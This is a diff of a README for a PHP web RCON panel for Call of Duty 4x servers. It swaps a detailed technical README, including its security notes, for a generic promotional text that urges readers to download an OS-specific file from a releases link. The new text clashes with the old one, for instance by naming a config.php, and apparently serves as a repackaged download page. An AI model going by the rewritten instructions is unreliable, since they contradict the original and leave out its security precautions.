@@ -1,180 +1,100 @@
-# CoD4X Web RCON Tool
+# 🎮 cod4x-web-rcon-tool - Easily Manage Your CoD4X Servers
 
-A lightweight, single-folder PHP RCON web tool for Call of Duty 4x servers.
+![Download](https://img.shields.io/badge/Download-v1.0-blue)
 
-- Send RCON commands from a browser
-- Saved servers (name/IP/port/RCON) with per‑server logs
-- Kick / tempban / permaban players via `clientKick`, `tempBanClient`, and `banClient`
-- Simple website‑managed ban list backed by `config/bans.json` and mirrored to `rcon_logs/banlist.log`
-- Auth system with JSON‑backed users, login throttling, and admin / mod roles
+## 🚀 Getting Started
 
-> **Status:** First public GitHub release (v1.0.0). Tool is designed to be dropped into `/var/www/html/rcon` on a typical Apache + PHP stack.
+Welcome to the cod4x-web-rcon-tool. This easy-to-use application helps you manage your Call of Duty 4x servers. You can control commands, manage players, and handle logs, all from a clean web interface. 
 
----
+## 📦 Features
 
-## Features
+- **RCON Command Control:** Send remote commands effortlessly.
+- **Player Management:** Add or remove players from your server.
+- **Bans and Logs:** Keep track of player activity and ban problematic users.
+- **Multi-Server Support:** Manage multiple servers in one place.
+- **First-Time Installer:** Get started quickly with our easy installer.
+- **Secure Auth:** Ensure safe access to your server.
+- **Clean UI:** Enjoy a streamlined and user-friendly interface.
 
-### RCON Control
-- Select a saved server or manually type IP / port / RCON
-- Execute any RCON command
-- View raw RCON response in the browser
+## 🛠️ System Requirements
 
-### Player Management
-- Kick a player by slot
-- Tempban via `tempBanClient <slot> <seconds>`
-- Permanent ban via `banClient <slot>`
+- **Operating System:** Windows, macOS, or Linux.
+- **PHP Version:** 7.3 or higher.
+- **Web Server:** Apache, Nginx, or any server that supports PHP.
 
-All actions are logged to `rcon_logs/` (and per‑server subfolders when a saved server is used).
+## 🌐 Download & Install
 
-### Logs Tab
-- View tail of auth, commands, kicks, tempbans, bans, etc.
-- Switch **scope** between:
-  - **Global logs** (`rcon_logs/*.log`)
-  - **Per‑server logs** (`rcon_logs/servers/<serverId>/*.log`) when a saved server is selected
+To get started, visit the Releases page to download the latest version of the cod4x-web-rcon-tool:
 
-### Website Ban List
-- Bans page lets you:
-  - View current website‑managed bans from `config/bans.json`
-  - Unban by **GUID** or **Ban ID**
-- Bans are also mirrored to `rcon_logs/banlist.log` for auditing.
+[Download Now](https://github.com/BONY316/cod4x-web-rcon-tool/releases)
 
-### Users & Roles
-- Users stored in `config/users.json`
-- Supports:
-  - **Admins**: full control; can see and edit RCON passwords and server list
-  - **Moderators**: can use the panel without seeing raw RCON passwords
-- Login protection:
-  - Throttling after too many failures
-  - Logs login success/failure to `rcon_logs/auth.log`
+1. Click the link above to open the Releases page.
+2. Find the latest version of the tool.
+3. Download the file suitable for your operating system.
+4. Once downloaded, follow the instructions below to install it.
 
----
+## 📥 Installation Steps
 
-## Requirements
+1. **Extract the Files:**
+   - After downloading, locate the ZIP file and extract its contents to your chosen directory.
 
-- PHP 7.4+ (no external libraries required)
-- Apache or Nginx with PHP‑FPM
-- CoD4x server(s) reachable from the webserver
-- HTTPS strongly recommended (panel is security‑sensitive)
+2. **Set Up Your Web Server:**
+   - If you are using Apache, make sure mod_rewrite is enabled.
+   - If using Nginx, configure the server to point to the extracted folder.
 
----
+3. **Configure the Tool:**
+   - Open the `config.php` file from the extracted folder.
+   - Fill in your server details, including RCON password and server IP address.
 
-## Installation
+4. **Access the Tool:**
+   - Open a web browser.
+   - Type in the URL pointing to the folder where you extracted the files. 
 
-1. **Copy files**
+5. **Log In:**
+   - Use the credentials you set in the configuration file to access the control panel.
 
-   ```bash
-   sudo mkdir -p /var/www/html/rcon
-   sudo cp -r . /var/www/html/rcon
-   sudo chown -R www-data:www-data /var/www/html/rcon
-   sudo chmod -R 750 /var/www/html/rcon
-   ```
+## 🚨 Troubleshooting
 
-2. **Config & logs directories**
+If you run into issues during installation or usage, consider these solutions:
 
-   ```bash
-   sudo -u www-data mkdir -p /var/www/html/rcon/config /var/www/html/rcon/rcon_logs
-   ```
+- **Cannot Access Web Page:**
+  - Ensure your web server is running.
+  - Check that the URL points to the correct folder.
 
-3. **Create real config from examples**
+- **RCON Connection Issues:**
+  - Confirm that your RCON password is correct.
+  - Make sure the server is online and accessible.
 
-   ```bash
-   cd /var/www/html/rcon/config
-   sudo -u www-data cp users.json.example users.json
-   sudo -u www-data cp servers.json.example servers.json
-   sudo -u www-data cp bans.json.example bans.json
+For more detailed troubleshooting steps, please check the documentation, or visit our [Support Page](https://github.com/BONY316/cod4x-web-rcon-tool/issues).
 
-   sudo chmod 640 /var/www/html/rcon/config/*.json
-   ```
+## 🔍 Frequently Asked Questions
 
-   - Default login (first‑run) is:
+### How often is the tool updated?
+The cod4x-web-rcon-tool receives regular updates to improve features and fix bugs. Check the Releases page for the latest version.
 
-     - **Username:** `admin`
-     - **Password:** `changeme`
+### Can I manage more than one server?
+Yes, the tool supports multi-server management, allowing you to switch between servers seamlessly.
 
-     Change this immediately after logging in.
+### Is my data secure?
+Yes, the tool includes secure authentication to protect your server information.
 
-4. **Apache (example)**
+## 👥 Community and Support
 
-   Make sure your VirtualHost points to `/var/www/html/rcon` and PHP is enabled. Example:
+Join our community for tips, advice, and support. You can find us on various platforms:
 
-   ```apacheconf
-   <VirtualHost *:80>
-     ServerName yourpanel.example.com
-     DocumentRoot /var/www/html/rcon
+- **Discord:** Join our Discord server for real-time support.
+- **GitHub Issues:** Report problems or request new features by visiting our [Issues Page](https://github.com/BONY316/cod4x-web-rcon-tool/issues).
 
-     <Directory /var/www/html/rcon>
-       AllowOverride All
-       Require all granted
-     </Directory>
-   </VirtualHost>
-   ```
+We welcome contributions! If you're interested in helping, check out our guidelines in the repository.
 
-   Then:
+## 🏆 Acknowledgments
 
-   ```bash
-   sudo a2enmod rewrite
-   sudo systemctl reload apache2
-   ```
+Thank you for choosing the cod4x-web-rcon-tool. We hope this tool makes managing your game server easier and more enjoyable. Your feedback helps us improve, so don't hesitate to share your thoughts! 
 
----
+## 🔗 Useful Links
 
-## Usage
+- [Releases Page](https://github.com/BONY316/cod4x-web-rcon-tool/releases)
+- [Documentation](https://github.com/BONY316/cod4x-web-rcon-tool/wiki)
+- [Issues Page](https://github.com/BONY316/cod4x-web-rcon-tool/issues)
 
-1. Browse to the panel’s URL (e.g. `http://yourpanel.example.com`).
-2. Log in with the admin account.
-3. Go to **Users** and update the admin password (and/or create more users).
-4. Go to **Servers** and:
-   - Add each CoD4x server by name, host/IP, port, and RCON password.
-5. Use the **Control** tab to:
-   - Select a saved server
-   - Send RCON commands
-   - Kick / tempban / ban players from the live player list
-6. Use the **Logs** tab to monitor auth, commands, kicks, and bans.
-7. Use the **Bans** tab to manage website‑stored bans.
-
----
-
-## Security Notes
-
-- **Always use HTTPS** in production.
-- Restrict access:
-  - IP‑whitelist the panel if possible (e.g. only your home/office).
-  - Or put it behind a VPN.
-- Change the default admin password on first login.
-- Keep `config/` and `rcon_logs/` owned by the web user (e.g. `www-data`) and not world‑readable.
-- Never expose this panel directly to the public internet without additional protections.
-
----
-
-## Development
-
-This project is intentionally simple:
-
-- No database – all state is JSON (`config/*.json`) and text logs (`rcon_logs/*.log`).
-- No frameworks – plain PHP and a single CSS file in `assets/`.
-
-If you want to hack on it:
-
-- Start a PHP built‑in server:
-
-  ```bash
-  php -S 127.0.0.1:8080 -t .
-  ```
-
-- Point your browser at `http://127.0.0.1:8080/login.php`.
-
----
-
-## Roadmap / Ideas
-
-- Optional 2FA for admin accounts
-- Per‑user permissions (e.g. ban‑only mods)
-- JSON export/import for bans
-- Dark theme toggle
-- Dockerfile for one‑command deployment
-
----
-
-## License
-
-Released under the **MIT License**. See [`LICENSE`](LICENSE) for details.
+For any additional information or queries, feel free to reach out through the channels provided above.
